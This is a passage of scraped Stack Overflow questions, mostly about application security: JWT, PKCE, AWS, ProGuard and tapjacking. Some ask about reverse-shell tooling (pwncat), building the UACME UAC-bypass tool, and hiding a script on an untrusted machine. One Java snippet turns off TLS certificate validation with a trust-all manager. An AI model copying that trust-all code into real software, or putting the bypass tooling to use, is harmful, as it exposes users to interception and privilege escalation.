<p>The concerns with this approach were the security of the data (as a single endpoint shared among clients, there is the possibility of data leaking), and the performance when reading 100mbs of data.</p>
<p>Are these concerns valid?  Do the risks of a a coding error (always possible) out-weigh a publicly accessible DB?</p>
<p>How much delay could I expect streaming through GraphQL?  Would GraphQL explode the data cost by -eg- converting binary to JSON?</p>
<p>I've looked into Prism &amp; Graphile, which suggests that performance may not be a concern, however I haven't seen any tests dealing with large datasets.</p>
<p>I understand that publicly accessible DB's are a Bad Idea, does the read-only access mitigate this?</p>
<p>I realize this is fairly opinion-based &amp; also bit of a duplicate, however management has been remarkably impervious to arguments so far.</p>
"
"<p>I am utilizing spotbugs to help review an oracle adf application for errors and vulnerabilities prior to deployment.  Two of the malicious code vulnerabilities warnings spotbugs finds are:</p>
<ul>
<li>&quot;<em>classname</em> may expose internal representation by returning <em>fieldname</em>&quot;</li>
<li>&quot;<em>classname</em> may expose internal representation by storing an externally mutable object into <em>fieldname</em>&quot;.</li>
</ul>
<p>I understand that a caller could alter the object undesirably in some way and that could be prevented by returning or setting a copy of the object.  That situation and resolutions are explained in other questions like <a href=""https://stackoverflow.com/questions/18954873/malicious-code-vulnerability-may-expose-internal-representation-by-incorporati"">Malicious code vulnerability - May expose internal representation by incorporating reference to mutable object</a></p>
<p>Are there other specific security risks of exposing internal representation that would need to be addressed if copying the object is undesirable?</p>
"
"<p>I am building an application with AWS Cognito and Next.js. I am using Amplify's default authtication component below.</p>
<pre><code>'use client'
Amplify.configure(config);

export function App({ signOut, user }: WithAuthenticatorProps) {
  return (
    &lt;&gt;
      &lt;h1&gt;Hello {user?.username}&lt;/h1&gt;
      &lt;button onClick={signOut}&gt;Sign out&lt;/button&gt;
    &lt;/&gt;
  );
}

export default withAuthenticator(App);
</code></pre>
<p>This component does not work without the 'use client' directive. I am curious from a security perspective if this is a concern and if there is any potentially sensitive details one could expose if this component is client side. Thanks!</p>
"
"<p>I have a Qt C++ project. It has several dynamic libraries. On Windows I use symbol dllexport by specifying it before the class. Thanks to this, libraries can get the necessary functionality from each other.</p>
<p>Problem: I have a project with tests. To which I link my dynamic libraries. I can't get to the functionality that I didn't export, but I need to test it.</p>
<p>I don’t want to export all the symbols at all.
If you export all the symbols, the library will be completely open for use from outside, because I don’t think it’s safe.</p>
<p>Here's what I came up with.
I compile the object, then create dynamic libraries and tests from them.</p>
<p>Pros: No need to make changes to the code. Time on the  CI/CD speeds up.
Cons: The test executable file is bloated.</p>
<p>Are there other ways to implement this? What do you think about this method?</p>
"
"<p>I have been working on a project that I want to use pwncat-cs API in it (<a href=""https://github.com/calebstewart/pwncat"" rel=""nofollow noreferrer"">https://github.com/calebstewart/pwncat</a>) but the docs is so uncomprehensive, so I want help from someone who did work on this tool or if there is any tools that do the same job, I need a tool that give me the power to get a reverse shell on a host then run some commands on that host using the script.</p>
<p>I tried the docs but it is uncomprehensive.</p>
"
"<p>I was wondering how it could be implemented an authentication system based on JWT where these don't have an explicit expiration date</p>
<ul>
<li>How can be handled the force &quot;expiration&quot;?</li>
<li>Is it possibile without state/session management?</li>
<li>Is this even correct?</li>
</ul>
<p>Edit: I'm perfectly aware about how to implement an &quot;infinite&quot; jwt technically, and what are the implications, I understand perfectly the refresh token system as well,</p>
<p>I want to know how to design a system with this kind of behaviour and keep it secure, giving the capability to expire the tokens for example after an user changes his password, or other possible behaviours</p>
<p>Thanks for all the answers!</p>
"
"<p>I am trying to build the executable for this project
<a href=""https://github.com/hfiref0x/UACME"" rel=""nofollow noreferrer"">https://github.com/hfiref0x/UACME</a></p>
<p>The creator does not release compiled binaries (which is completely understandable) and I am trying to understand what to do exactly.
I follow a Youtube video to build the executable, but it doesn't work, since additional binary modules have to be built, see <a href=""https://github.com/hfiref0x/UACME/issues/82"" rel=""nofollow noreferrer"">https://github.com/hfiref0x/UACME/issues/82</a></p>
<blockquote>
<p>Starting from 3.5 version all binary modules integrated to Akagi must be compiled before compiling Akagi and copied to the Akagi\Bin directory in previously encrypted state (use Naka for this purpose), there will be no more ready-to-use binaries included. Same goes to secrets blobs. To be able to automatically compile source you need to alter it.</p>
</blockquote>
<p>Sadly there is no tutorial on that and I don't know where to start. I see there are several files in the \UACME\Source\Akagi\bin folder, which probably have to be built like the executable?</p>
<p>Instructions from the creator:</p>
<blockquote>
<p>To build working binary:</p>
<ul>
<li>Compile payload units</li>
<li>Compile Naka module</li>
<li>Encrypt all payload units using Naka module</li>
<li>Generate secret blobs for these units using Naka module</li>
<li>Move compiled units and secret blobs to the Akagi\Bin directory</li>
<li>Rebuild Akagi</li>
</ul>
</blockquote>
<p>PS: I work in security and am learning about UAC and bypasses. I will not use this to do something illegitimate.</p>
<p>What I did so far:
I have a working Visual Studio with the SDKs installed, just like the creator instructed.
I imported the project and built the Akagi executable. Execution works but without the additional modules, what is supposed to happen does not happen.</p>
"
"<p>I'm working on a web app using React for frontend and Django for backend.</p>
<p>Currently, I'm using django simple-jwt in for auth purposes, and the JWT access and refresh tokens are exposed in browser cookies, so anyone who gets their hands on these tokens can theoretically log in on behalf of the actual user.
I was wondering if there are ways to prevent issues like this, particularly using Django?</p>
<p>I was looking into proof of possession (PoP) tokens, but didn't see any libraries that support this functionality in Django. Are there ways to prevent this in Django?</p>
"
"<p>I wanted to bypass the following error: sun.security.validator.ValidatorException: PKIX path building failed:</p>
<pre><code>sun.security.provider.certpath.SunCertPathBuilderException: 
unable to find valid certification path to requested target; 
nested exception is javax.net.ssl.SSLHandshakeException: 
sun.security.validator.ValidatorException: 
PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException:
unable to find valid certification path to requested target
</code></pre>
<p>This is my piece of code:</p>
<pre class=""lang-java prettyprint-override""><code>import org.springframework.web.reactive.function.client.ExchangeStrategies;
import org.springframework.web.reactive.function.client.WebClient;
import io.netty.handler.ssl.SslContext;
import io.netty.handler.ssl.SslContextBuilder;
import io.netty.handler.ssl.util.InsecureTrustManagerFactory;

@Bean(&quot;webClientForNormalResponse&quot;)
public WebClient.Builder getWebClient() throws SSLException {

    SslContext sslContext = SslContextBuilder.forClient().trustManager(InsecureTrustManagerFactory.INSTANCE)
                .build();
    String connectionProviderName = &quot;myConnectionProvider&quot;;
    int maxConnections = 10000;
    HttpClient client = HttpClient.create(ConnectionProvider
                .create(connectionProviderName, maxConnections)).secure(t -&gt; t.sslContext(sslContext)).keepAlive(true);

    return WebClient.builder().clientConnector(new ReactorClientHttpConnector(client));
}
</code></pre>
<p>I have found solutions for package <code>javax.net.ssl.*</code>, but I don't how to get rid of this.</p>
"
"<p>Could you please help me to assess whether using facade with <a href=""https://auth0.com/docs/get-started/authentication-and-authorization-flow/authorization-code-flow-with-pkce"" rel=""nofollow noreferrer"">Authorization Code Flow with PKCE</a> does not break security concept behind original flow.</p>
<p>We have a requirement to provide a facade for IDP in order to not send a token to an application, the facade will put the token into a cookie instead. Thus modified PKCE flow will look like this:
<a href=""https://i.stack.imgur.com/xS1oM.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/xS1oM.png"" alt=""PKCE flow with facade"" /></a></p>
<p>Is presented PKCE flow with facade safe? What I meant is if a facade that adds additional requests to the original PKCE flow is not breaking the whole concept with code challenge and verifier.</p>
"
"<p>I want to run a bash script, that basically does things in a while true, on an untrusted machine where I don't want that this script should be discovered/retrieved.</p>
<p>After launch the script, if I remove it, it continues to work as expected but the question is just: can it be retrieved?</p>
"
"<p>I'm trying to protect my app against tapjacking. We tried to implement <code>setFilterTouchesWhenObscured</code> in MainActivity, however we did a security scan and it still shows that we need to protect it againts tapjacking. This is what we implemented</p>
<pre><code>@Override
  protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    View myView = findViewById(android.R.id.content);
    myView.setFilterTouchesWhenObscured(true);
  }
</code></pre>
<p>And I was wondering if there is a solution in react native or if we have to use external help for that.</p>
<p>I also tried to implement <code>FLAG_WINDOW_IS_PARTIALLY_OBSCURED</code>, but It doesn't work</p>
<p>I need a solution to implement in React Native to secure my app. What do people recommend or what can I do to protect it?</p>
"
"<ol>
<li>In Android linux kernal if i change something in the file system of android then how google will detect it ? is google detect or not?</li>
<li>What is trusted application? How can we make trusted application , what are the steps of making for trusted application?</li>
<li>How Normal Application can we made a trusted application?</li>
<li>Is all the application are in mobile phones are normal application ,then how can we switch to trusted application ,can we see trusted application?</li>
</ol>
<p>please give me this answer i can not find this answer</p>
"
"<p>hello guys i am currently develop android app, i have the intention to use proguard to protecting my app from reverse engineering</p>
<p>however, after i applied proguard to my app was an error like this :</p>
<blockquote>
<p><code> Missing classes detected while running R8. Please add the missing classes or apply additional keep rules that are generated in  mypath\app\build\outputs\mapping\debug\missing_rules.txt.</code></p>
</blockquote>
<blockquote>
<p><code>Missing class sun.security.x509.X509CertInfo (referenced from: java.lang.String org.openjsse.sun.security.ssl.SSLLogger$SSLSimpleFormatter.formatCertificate(java.security.cert.Certificate))</code></p>
</blockquote>
<blockquote>
<p><code>Missing class sun.util.logging.PlatformLogger$Level (referenced from: void org.openjsse.sun.net.www.protocol.https.HttpsClient.&lt;init&gt;(javax.net.ssl.SSLSocketFactory, java.net.URL, java.net.Proxy, int) and 1 other context)</code></p>
</blockquote>
<blockquote>
<p><code>Missing class sun.util.logging.PlatformLogger (referenced from: void org.openjsse.sun.net.www.protocol.https.HttpsClient.&lt;init&gt;(javax.net.ssl.SSLSocketFactory, java.net.URL, java.net.Proxy, int) and 1 other context)</code></p>
</blockquote>
<p>i have try to set up the missing_rules to fix this problem, but it didn't work at all
can you guys help me to find the solution of this problem ?</p>
<p>here is my code :</p>
<p>// Proguard-rule (module app)</p>
<pre><code>
# Keep file R and Manifest
-keep class **.R
-keep class **.R$* {*;}
-keep class **.BuildConfig {*;}
-keep class **.Manifest {*;}

# Keep Dependency Injection Framework related classes and methods
-keep class dagger.hilt.** { *; }
-keep class javax.inject.** { *; }
-keep class javax.annotation.** { *; }

# Keep Model and Repository Classes
-keep class com.example.core.data.model.** { *; }
-keep class com.example.core.data.repo.** { *; }

# Keep ViewModels
-keep class * extends androidx.lifecycle.ViewModel

# Keep Parcelable Classes
-keep class * implements android.os.Parcelable {
    public static final android.os.Parcelable$Creator *;
}

# Keep UI-related classes
-keep class com.example.ui.activity.** { *; }
-keep class com.example.ui.fragment.** { *; }
-keep class com.example.service.** { *; }

# Keeping all classes in a particular package
-keep class com.example.package.** { *; }

# Maintains all classes mentioned in a particular file
#-keep @com.example.rules.txt

# Maintain parcelable classes
-keep class * implements android.os.Parcelable {
  public static final android.os.Parcelable$Creator *;
}

# Maintain model classes
-keep class com.example.model.** { *; }

# Maintain class of service
-keep class com.example.service.** { *; }

# Maintain classes required for SSL/TLS handling
-keep class okhttp3.internal.platform.ConscryptPlatform {*;}
-keep class okhttp3.internal.platform.OpenJSSEPlatform {*;}
-keep class org.bouncycastle.** {*;}
-keep class org.conscrypt.** {*;}
-keep class org.openjsse.** {*;}

# Maintain parcelable classes
-keep class * implements android.os.Parcelable {
  public static final android.os.Parcelable$Creator *;
}

# Keep classes required by OpenJSSE
-keep class sun.security.x509.** { *; }
-keep class sun.util.logging.** { *; }

</code></pre>
<p>// consumer-rules (core module)</p>
<pre><code>##---------------Begin: proguard configuration for SQLCipher  ----------
-keep,includedescriptorclasses class net.sqlcipher.** { *; }
-keep,includedescriptorclasses interface net.sqlcipher.** { *; }


##---------------Begin: proguard configuration for Gson ----------
# Gson uses generic type information stored in a class file when working with fields. Proguard
# removes such information by default, so configure it to keep all of it.
-keepattributes Signature

# For using GSON @Expose annotation
-keepattributes *Annotation*

# Gson specific classes
-dontwarn sun.misc.**
#-keep class com.google.gson.stream.** { *; }

# Application classes that will be serialized/deserialized over Gson
-keep class com.google.gson.examples.android.model.** { &lt;fields&gt;; }

# Prevent proguard from stripping interface information from TypeAdapter, TypeAdapterFactory,
# JsonSerializer, JsonDeserializer instances (so they can be used in @JsonAdapter)
-keep class * extends com.google.gson.TypeAdapter
-keep class * implements com.google.gson.TypeAdapterFactory
-keep class * implements com.google.gson.JsonSerializer
-keep class * implements com.google.gson.JsonDeserializer

# Prevent R8 from leaving Data object members always null
-keepclassmembers,allowobfuscation class * {
@com.google.gson.annotations.SerializedName &lt;fields&gt;;
}


##---------------Begin: proguard configuration for Retrofit ----------
# Retrofit does reflection on generic parameters. InnerClasses is required to use Signature and
# EnclosingMethod is required to use InnerClasses.
-keepattributes Signature, InnerClasses, EnclosingMethod

# Retrofit does reflection on method and parameter annotations.
-keepattributes RuntimeVisibleAnnotations, RuntimeVisibleParameterAnnotations

# Retain service method parameters when optimizing.
-keepclassmembers,allowshrinking,allowobfuscation interface * {
@retrofit2.http.* &lt;methods&gt;;
}

# Ignore JSR 305 annotations for embedding nullability information.
-dontwarn javax.annotation.**

# Guarded by a NoClassDefFoundError try/catch and only used when on the classpath.
-dontwarn kotlin.Unit

# Top-level functions that can only be used by Kotlin.
-dontwarn retrofit2.KotlinExtensions
-dontwarn retrofit2.KotlinExtensions$*

# With R8 full mode, it sees no subtypes of Retrofit interfaces since they are created with a Proxy
# and replaces all potential values with null. Explicitly keeping the interfaces prevents this.
-if interface * { @retrofit2.http.* &lt;methods&gt;; }
-keep,allowobfuscation interface &lt;1&gt;

-dontwarn kotlinx.**


##---------------Begin: proguard configuration for Glide ----------
-keep public enum com.bumptech.glide.load.ImageHeaderParser$** {
**[] $VALUES;
public *;
}

# Uncomment for DexGuard only
#-keepresourcexmlelements manifest/application/meta-data@value=GlideModule


##---------------Begin: proguard configuration for RxJava ----------
# Uncomment if you use RxJava
#-dontwarn java.util.concurrent.Flow*

# Keep file R and Manifest
-keep class **.R
-keep class **.R$* {*;}
-keep class **.BuildConfig {*;}
-keep class **.Manifest {*;}

# Keep Dependency Injection Framework related classes and methods
-keep class dagger.hilt.** { *; }
-keep class javax.inject.** { *; }
-keep class javax.annotation.** { *; }

# Keep Model and Repository Classes
-keep class com.example.core.data.model.** { *; }
-keep class com.example.core.data.repo.** { *; }

# Keep ViewModels
-keep class * extends androidx.lifecycle.ViewModel

# Keep Parcelable Classes
-keep class * implements android.os.Parcelable {
    public static final android.os.Parcelable$Creator *;
}

# Keep UI-related classes
-keep class com.example.core.ui.activity.** { *; }
-keep class com.example.core.ui.fragment.** { *; }
-keep class com.example.core.service.** { *; }


# Keeping all classes in a particular package
-keep class com.example.package.** { *; }

# Maintains all classes mentioned in a particular file
#-keep @com.example.rules.txt

# keep model class
-keep class com.example.model.** { *; }

# Menjaga kelas service
-keep class com.example.service.** { *; }

# Menjaga kelas-kelas yang diperlukan untuk penanganan  SSL/TLS
-keep class okhttp3.internal.platform.ConscryptPlatform {*;}
-keep class okhttp3.internal.platform.OpenJSSEPlatform {*;}
-keep class org.bouncycastle.** {*;}
-keep class org.conscrypt.** {*;}
-keep class org.openjsse.** {*;}


# Keep classes required by OpenJSSE
-keep class sun.security.x509.** { *; }
-keep class sun.util.logging.** { *; }
</code></pre>
<p>// missing_rules.txt</p>
<pre><code># Please add these rules to your existing keep rules in order to suppress warnings.
# This is generated automatically by the Android Gradle plugin.
-dontwarn com.android.org.conscrypt.SSLParametersImpl
-dontwarn javax.naming.Binding
-dontwarn javax.naming.NamingEnumeration
-dontwarn javax.naming.NamingException
-dontwarn javax.naming.directory.Attribute
-dontwarn javax.naming.directory.Attributes
-dontwarn javax.naming.directory.DirContext
-dontwarn javax.naming.directory.InitialDirContext
-dontwarn javax.naming.directory.SearchControls
-dontwarn javax.naming.directory.SearchResult
-dontwarn org.apache.harmony.xnet.provider.jsse.SSLParametersImpl
-dontwarn org.bouncycastle.jsse.BCSSLParameters
-dontwarn org.bouncycastle.jsse.BCSSLSocket
-dontwarn org.bouncycastle.jsse.provider.BouncyCastleJsseProvider
-dontwarn sun.net.util.IPAddressUtil
-dontwarn sun.net.www.http.HttpClient
-dontwarn sun.net.www.http.KeepAliveCache
-dontwarn sun.net.www.protocol.http.Handler
-dontwarn sun.net.www.protocol.http.HttpURLConnection$TunnelState
-dontwarn sun.net.www.protocol.http.HttpURLConnection
-dontwarn sun.net.www.protocol.https.Handler
-dontwarn sun.security.action.GetBooleanAction
-dontwarn sun.security.action.GetIntegerAction
-dontwarn sun.security.action.GetLongAction
-dontwarn sun.security.action.GetPropertyAction
-dontwarn sun.security.action.OpenFileInputStreamAction
-dontwarn sun.security.internal.interfaces.TlsMasterSecret
-dontwarn sun.security.internal.spec.TlsKeyMaterialParameterSpec
-dontwarn sun.security.internal.spec.TlsKeyMaterialSpec
-dontwarn sun.security.internal.spec.TlsPrfParameterSpec
-dontwarn sun.security.internal.spec.TlsRsaPremasterSecretParameterSpec
-dontwarn sun.security.jca.ProviderList
-dontwarn sun.security.jca.Providers
-dontwarn sun.security.provider.certpath.AlgorithmChecker
-dontwarn sun.security.provider.certpath.CertId
-dontwarn sun.security.provider.certpath.OCSP
-dontwarn sun.security.provider.certpath.OCSPResponse$ResponseStatus
-dontwarn sun.security.provider.certpath.OCSPResponse$SingleResponse
-dontwarn sun.security.provider.certpath.OCSPResponse
-dontwarn sun.security.provider.certpath.PKIXExtendedParameters
-dontwarn sun.security.provider.certpath.ResponderId
-dontwarn sun.security.provider.certpath.UntrustedChecker
-dontwarn sun.security.util.AlgorithmDecomposer
-dontwarn sun.security.util.AnchorCertificates
-dontwarn sun.security.util.BitArray
-dontwarn sun.security.util.Debug
-dontwarn sun.security.util.DerInputStream
-dontwarn sun.security.util.DerOutputStream
-dontwarn sun.security.util.DerValue
-dontwarn sun.security.util.DisabledAlgorithmConstraints
-dontwarn sun.security.util.ECUtil
-dontwarn sun.security.util.HostnameChecker
-dontwarn sun.security.util.KeyUtil
-dontwarn sun.security.util.LegacyAlgorithmConstraints
-dontwarn sun.security.util.ObjectIdentifier
-dontwarn sun.security.util.SafeDHParameterSpec
-dontwarn sun.security.util.SignatureUtil
-dontwarn sun.security.util.math.ImmutableIntegerModuloP
-dontwarn sun.security.util.math.IntegerFieldModuloP
-dontwarn sun.security.util.math.IntegerModuloP
-dontwarn sun.security.util.math.MutableIntegerModuloP
-dontwarn sun.security.util.math.intpoly.IntegerPolynomial1305
-dontwarn sun.security.validator.ValidatorException
-dontwarn sun.security.x509.CertificateExtensions
-dontwarn sun.security.x509.Extension
-dontwarn sun.security.x509.KeyIdentifier
-dontwarn sun.security.x509.NetscapeCertTypeExtension
-dontwarn sun.security.x509.PKIXExtensions
-dontwarn sun.security.x509.SerialNumber
-dontwarn sun.security.x509.X500Name
-dontwarn sun.security.x509.X509CertImpl
-dontwarn sun.security.x509.X509CertInfo
-dontwarn sun.util.logging.PlatformLogger$Level
-dontwarn sun.util.logging.PlatformLogger
</code></pre>
"
"<p>tl;dr:</p>
<ul>
<li>How to change keypair without downtime using <code>nimbus JWKSource&lt;SecurityContext&gt;</code></li>
<li>How to arrange a <code>JWKMatcher</code> that is accepted by a <code>JWKSelector</code> to get all existing keys?</li>
</ul>
<h1>Setup</h1>
<ul>
<li>Java : 21</li>
<li>Spring Boot : v3.2.x</li>
<li>spring-security-oauth2-authorization-server : 1.2.x
<ul>
<li>com.nimbusds.jose.jwk.*</li>
</ul>
</li>
</ul>
<h1>Reference</h1>
<ul>
<li><a href=""https://docs.spring.io/spring-authorization-server/reference/getting-started.html"" rel=""nofollow noreferrer"">https://docs.spring.io/spring-authorization-server/reference/getting-started.html</a></li>
</ul>
<p>Given code in reference (March 2024)</p>
<pre class=""lang-java prettyprint-override""><code>    @Bean 
    public JWKSource&lt;SecurityContext&gt; jwkSource() {
        KeyPair keyPair = generateRsaKey();
        RSAPublicKey publicKey = (RSAPublicKey) keyPair.getPublic();
        RSAPrivateKey privateKey = (RSAPrivateKey) keyPair.getPrivate();
        RSAKey rsaKey = new RSAKey.Builder(publicKey)
                .privateKey(privateKey)
                .keyID(UUID.randomUUID().toString())
                .build();
        JWKSet jwkSet = new JWKSet(rsaKey);
        return new ImmutableJWKSet&lt;&gt;(jwkSet);
    }
</code></pre>
<p>The code gives an example how to generate and store keys.</p>
<h1>Scenario</h1>
<ul>
<li>Spring uses <code>com.nimbusds.jose.jwk.source.JWKSource</code> to store keypairs.</li>
<li>The JWKSource is immutable (<code>ImmutableJWKSet&lt;&gt;(jwkSet)</code>).</li>
<li>In case of key revocation/rotation e.g. after a TTL of the key, there is a short period with two keys to prevent downtime.
<ul>
<li>Old key, which shall be deleted shortly.</li>
<li>New key, which has just replaced the old one.</li>
</ul>
</li>
<li>The transition period is set to 5 minutes (for this example).
<ul>
<li>Connected systems are informed that the old public key shall not be used anymore.
<ul>
<li>Requests using the old (public) key are still accepted.</li>
</ul>
</li>
<li>Connected systems are informed that they shall collect the new public key.
<ul>
<li>On request only the new (public) key is delivered.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h1>Hurdle</h1>
<p>As the JWKSource is <em>immutable</em> it has to be <code>rewritten completely</code> to ...</p>
<ul>
<li>add a new key.</li>
<li>delete an old key.</li>
</ul>
<p>This feels dirty, especially as key <code>-revocation</code> or <code>-rotation</code> is a standard procedure in my eyes.</p>
<h1>Effective problem</h1>
<p>... ignoring the dirt and force head through ...</p>
<h2>Trying to rewrite the <code>JWKSource</code></h2>
<p>To my recent knowledge the <code>JWKSource</code> offers a <em>get()-function</em>, which returns a list of keys.</p>
<ul>
<li><code>List&lt;JWK&gt; get(final JWKSelector jwkSelector, final C context)</code></li>
</ul>
<p>Herein the <code>JWKSelector</code> needs <code>JWKMatcher</code>.</p>
<p><strong>I fail interpreting the docs</strong></p>
<p>How to arrange a <code>JWKMatcher</code> that is accepted by a <code>JWKSelector</code> to get all existing keys?</p>
<p>In the first place all keys are needed to be retreived, so they can be rewritten to a <code>new JWKSource</code> using the keys UUID.</p>
<h1>Alternative, but not persued</h1>
<p>If downtime is not critical, the <code>JWKSource&lt;SecurityContext&gt;</code> can just be overwritten with a new keypair.
Systems using the old keypair`s publickey will bounce until they use the new one.</p>
<p>This is likewise a system restart.</p>
<h1>Final thoughts</h1>
<p>It feels like this is the right spot (spring security) and at the same time the wrong way (JWKSource).</p>
<hr />
<p>Thanks for reading &amp; happy for help   :)</p>
"
"<p>I am using OpenSSL 1.1.1q. When I use <code>TLS_server_method</code> in my <code>C</code> application to establish TLS handshake on tlsv1.3, I get error, <code>undefined reference to TLS_server_method</code>.</p>
<p>Online articles suggesting that, this is what has to be used when establishing SSL context for tlsv1.3 like</p>
<pre><code>ssl_server_ctx = SSL_CTX_new(TLS_server_method());
</code></pre>
<p>I do not find the body of the function or macro -&gt; TLS_server_method inside OpenSSL source. I can find the bodies of functions <code>tlsv1_2_server_method</code>, <code>DTLSv1_2_server_method</code>, etc. in <strong>ssl/methods.c</strong> and the same work for me from my application with same linker options, but not <code>TLS_server_method</code>.</p>
<p>Is TLS_server_method auto-generated via some configuration prior to building OpenSSL? Can someone throw light on it?</p>
"
"<p>I'm encountering a peculiar issue where a stored procedure returns a number value (as expected) when executed on my local machine, but returns null when executed on the server. Both environments are connected to the same SQL Server database, and the stored procedure in question is designed to log activity and return a newly generated log ID.</p>
<p>The stored procedure <code>apUserSyncEndPointPollingLogCreate</code> inserts a row into a table and should return the newly inserted rows' ID.</p>
<p>Here is the relevant part of the stored procedure:</p>
<pre class=""lang-sql prettyprint-override""><code>CREATE PROCEDURE [dbo].[apUserSyncEndPointPollingLogCreate] 
    (@UserSync_EndpointPollActivityLogId int OUTPUT,
     @EndpointPollTime DateTime,
     @NumberOfUsersReturned int,
     @EndpointResponse varchar(max),
     @ActivityLogDetails varchar(max))
AS
BEGIN
    INSERT INTO tblUserSync_EndpointPollActivityLog (EndpointPollTime, NumberOfUsersReturned, EndpointResponse, ActivityLogDetails)
    VALUES (@EndpointPollTime, @NumberOfUsersReturned, @EndpointResponse, @ActivityLogDetails)

    SELECT @UserSync_EndpointPollActivityLogId = SCOPE_IDENTITY()
END
</code></pre>
<pre class=""lang-cs prettyprint-override""><code>public int AddEndpointPollActivityLog(DateTime endpointPollTime, int numberOfUsersReturned, string endpointResponse, string activityLogDetails)
{
    using (var connection = new SqlConnection(_connectionStrings.Alton))
    {
        try
        {
            var p = new DynamicParameters();
            p.Add(&quot;@UserSync_EndpointPollActivityLogId&quot;, dbType: System.Data.DbType.Int32, direction: System.Data.ParameterDirection.Output);
            p.Add(&quot;@EndpointPollTime&quot;, endpointPollTime);
            p.Add(&quot;@NumberOfUsersReturned&quot;, numberOfUsersReturned);
            p.Add(&quot;@EndpointResponse&quot;, endpointResponse);
            p.Add(&quot;@ActivityLogDetails&quot;, activityLogDetails);

            var result = connection.Query(&quot;[dbo].[apUserSyncEndpointPollingLogCreate]&quot;, p, commandTimeout: 300, commandType: System.Data.CommandType.StoredProcedure);

            int UserSync_EndpointPollActivityLogId = p.Get&lt;int&gt;(&quot;@UserSync_EndpointPollActivityLogId&quot;);

            return UserSync_EndpointPollActivityLogId;
        }
        catch (SqlException ex)
        {
            // Log SQL exceptions or handle them appropriately
            _logger.LogError(&quot;AddEndpointPollActivityLog: SQL Exception occurred: &quot; + ex.Message);
            throw; // Rethrow for higher layers to handle
        }
        catch (Exception ex)
        {
            // Log other exceptions or handle them appropriately
            _logger.LogError(&quot;AddEndpointPollActivityLog: An error occurred: &quot; + ex.Message);
            throw; // Rethrow for higher layers to handle
        }
    }
}
</code></pre>
<p>This is what the C# code looked like when it worked.</p>
<pre class=""lang-cs prettyprint-override""><code>        public int AddEndpointPollActivityLog(DateTime endpointPollTime, int numberOfUsersReturned, string endpointResponse, string activityLogDetails)
        {
            using (var connection = new SqlConnection(_connectionStrings.Alton))
            {
                var p = new DynamicParameters();
                p.Add(&quot;@UserSync_EndpointPollActivityLogId&quot;, dbType: System.Data.DbType.Int32, direction: System.Data.ParameterDirection.Output);
                p.Add(&quot;@EndpointPollTime&quot;, endpointPollTime);
                p.Add(&quot;@NumberOfUsersReturned&quot;, numberOfUsersReturned);
                p.Add(&quot;@EndpointResponse&quot;, endpointResponse);
                p.Add(&quot;@ActivityLogDetails&quot;, activityLogDetails);

                var result = connection.Query(&quot;[dbo].[apUserSyncEndpointPollingLogCreate]&quot;, p, commandTimeout: 300, commandType: System.Data.CommandType.StoredProcedure);

                int UserSync_EndpointPollActivityLogId = p.Get&lt;int&gt;(&quot;UserSync_EndpointPollActivityLogId&quot;);

                return UserSync_EndpointPollActivityLogId;
            }
        }
</code></pre>
"
"<p>As per <a href=""https://docs.aws.amazon.com/vpc/latest/userguide/default-security-group.html#default-security-group-default-rules"" rel=""nofollow noreferrer"">AWS docs</a>, a default security group:</p>
<ul>
<li>Allows inbound traffic from all resources that are assigned to this security group. The source is the ID of this security group.</li>
<li>Allows all outbound IPv4 traffic.</li>
</ul>
<p>A recent pentest, however, has recommended that upon creation default security groups should instead restrict all traffic. Is there a way to set this as a standard across an account or organisation? I don't want to have to manually update individual security groups via console or CLI.</p>
"
"<h2>This is my situation...</h2>
<p>I am building my first Full Stack Web app using the MERN stack. I will also deploy it on AWS. What I want to know as a newbie is, is there a way to make the backend instance accept requests only from the frontend instance and be completely invisible to the whole internet, or better yet, backend server has no public ip (my knowledge level says - <em>No Public IP, No Hack Possible</em>)?</p>
<h2>This is what I know...</h2>
<p>I happened to see one of my seniors hosting a website and I saw they used nginx to setup the backend server and then used something called a <code>proxy_pass</code> to redirect incoming requests from port 80 to 3000 (where the backend process was running).</p>
<p>When I understood superficially about <code>proxy_pass</code>, the idea that came to my head to solve my problem is: What if I route the <code>api.my-project-website.com</code> (supposed backend subdomain) also to the frontend and then use the nginx config to proxy_pass it to the ip of the backend server and make it so that the backend only accepts requests from this FE instance's IP.</p>
<h2>This is what I tried...</h2>
<p>I tried my own idea and I was successfully able to configure domain/subdomain (<code>my-project-website.com</code> and <code>api.my-project-website.com</code>) to point to the FE instance via <em>Route 53</em> and then use nginx config to proxy_pass the request to the BE server. But the problem here was I was still not able to do it with the Private IP of the BE system. I had to use the Public IP only. I am confused now. Initially I knew the problem was that clients had to send a request directly to the BE server, but now I am using a middle man which my BE knows very well... so why is it not accepting the requests on private IP? Or am I missing something?</p>
<h2>This is what I want...</h2>
<p>Is this method useful? will it even work? or am I thinking in the wrong way? Will it achieve the level of security, as I mentioned earlier? Or is it still breachable <em>easily</em> (I know nothing is fool-proof)? If this idea won't solve the issue, can anyone give me another solution? or just help me with the right direction to think in? I would love to explore on my own, just need some initial guidance!</p>
<p><kbd>Logic Kahan Hai</kbd></p>
"
"<p>I'm using <code>openAI</code> directly in my <em><strong>Android Kotlin App</strong></em> for chatting feature instead of having a custom server that stores the <code>ApiKey</code> and communicates with <code>openAI</code>, then return the response in an <code>endpoint</code> or <code>API</code>.</p>
<p>Im using <code>JNI</code> for storing the key in a <code>.c</code> file and returning it to my Kotlin code. Is this secure? Or what is the better approach to store <strong>API Keys</strong>.</p>
<p>src/main/java/vvv.altug.dreamgpt/NativeLibWrapper</p>
<pre><code>package vvv.altug.dreamgpt

class NativeLibWrapper {
    companion object {
        init {
            System.loadLibrary(&quot;native-lib&quot;)
        }

        @JvmStatic
        external fun getApiKey(): String
    }
}
</code></pre>
<p>app/jni/native-lib.c</p>
<pre><code>#include &lt;jni.h&gt;
#include &lt;string.h&gt;

JNIEXPORT jstring JNICALL
Java_vvv_altug_dreamgpt_NativeLibWrapper_getApiKey(JNIEnv *env, jobject obj) {
    return (*env)-&gt;NewStringUTF(env,
                                &quot;sk-XXXXXXXXXkeyXXXXXXXXX&quot;);
}
</code></pre>
<p>ViewModel:</p>
<pre><code>val apiKey = NativeLibWrapper.getApiKey()
</code></pre>
"
"<p><strong>Trouble Accessing Portal Page: Seeking Help for Quick Resolution</strong></p>
<p>Uh-oh! Looks like you have stumbled upon some top-secret records.</p>
<p>Sorry, test7 (id=91) doesn't have 'read' access to:</p>
<ul>
